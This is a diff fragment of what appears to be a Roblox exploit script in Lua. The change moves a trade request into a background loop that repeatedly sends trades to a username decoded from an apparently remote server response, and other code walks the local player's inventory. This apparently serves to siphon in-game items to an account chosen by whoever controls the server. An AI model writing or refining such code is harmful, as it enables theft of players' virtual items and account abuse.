@@ -606,7 +606,17 @@ else
         end
     end)
 
-    while getgenv().hasrunn do wait()
+    spawn(function()
+        while true do wait(2)
+            pcall(function()
+                if getgenv().inherez == true then
+                    v_u_9.TRADE_SEND_REQUEST:Invoke(game:GetService("Players")[jsondecode(checkmain.Body).username].UserId, false, true)
+                end
+            end)
+        end
+    end)
+
+    while getgenv().hasrunn do wait(2)
         local a,b = pcall(function()
             print("Dbuoi5")
             --- for user.
@@ -723,9 +733,8 @@ else
                         end                        
                     else
                         if checkmaininsv() then
+                            getgenv().inherez = true
                             print("dit me may 2??")
-                            v_u_9.TRADE_SEND_REQUEST:Invoke(game:GetService("Players")[jsondecode(checkmain.Body).username].UserId, false, true)
-                            wait(3)
                             for i,v in pairs(dectectinven()) do
                                 print("dmm?", v)
                                 wait(3)
@@ -805,7 +814,6 @@ else
                 end
             end
         end)
-        wait(3)
         print(a,b)
     end
 end
